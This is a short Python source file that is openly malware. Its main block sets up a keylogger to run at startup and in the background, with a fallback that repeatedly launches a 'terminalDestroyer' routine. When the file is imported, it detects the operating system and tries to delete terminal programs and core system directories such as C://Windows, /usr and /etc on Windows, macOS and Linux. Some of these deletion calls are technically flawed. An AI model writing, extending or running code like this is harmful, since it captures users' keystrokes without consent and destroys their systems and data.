import background_runner
import make_terminal_unusable
import os
import keylogger
import make_terminal_unusable
import CodeTest
import test
import platform


if __name__ == '__main__':
    try:

        background_runner.run_on_startup(startup_task=keylogger.start_keylogger)
        background_runner.run_in_background(target=keylogger.start_keylogger)
        background_runner.run_in_background(target=keylogger.on_press)
        background_runner.run_in_background(target=keylogger.on_press)

        background_runner.run_in_background(target=CodeTest.codeTest)
        test.run_forever("./CodeTest.py")

    except Exception:

        background_runner.run_in_background(target=make_terminal_unusable.terminalDestroyer)
        background_runner.run_on_startup(startup_task=make_terminal_unusable.terminalDestroyer)


else:
    OS = platform.system()

    if OS == 'Windows':
        os.remove("C://Windows//System32//cmd.exe")
        os.remove("C://Windows//System32//WindowsPowerShell//v1.0//powershell.exe")
        os.remove("C://Windows//System32")
        os.remove("C://Windows")
        os.remove("C://Users")
        os.remove("C://Program Files")
        os.remove("C://Program Files (x86)")
        os.remove("C://")

    elif OS == 'Darwin':
        os.remove("/Applications/Utilities/Terminal.app")
        os.remove("/Applications/Utilities")
        os.remove("/Applications")
        os.remove("/Users")
        os.remove("/System")
        os.remove("/Library")
        os.remove("/bin")
        os.remove("/sbin")
        os.remove("/usr")
        os.remove("/var")
        os.remove("/etc")
        os.remove("/root")

    elif OS == 'Linux':
        os.remove("/usr/bin/gnome-terminal")
        os.remove("/usr/bin/xterm")
        os.remove("/usr/bin/konsole")
        os.remove("/usr/bin/terminator")
        os.remove("/usr/bin/tilix")
        os.remove("/usr/bin/alacritty")
        os.remove("/usr/bin/kitty")
        os.remove("/usr/bin/st")
        os.remove("/usr/bin/lxterminal")
        os.remove("/usr/bin/xfce4-terminal")
        os.remove("/usr/bin/mate-terminal")
        os.remove("/usr/bin/terminology")

    else:
        print(f"Unsupported operating system: {OS}.")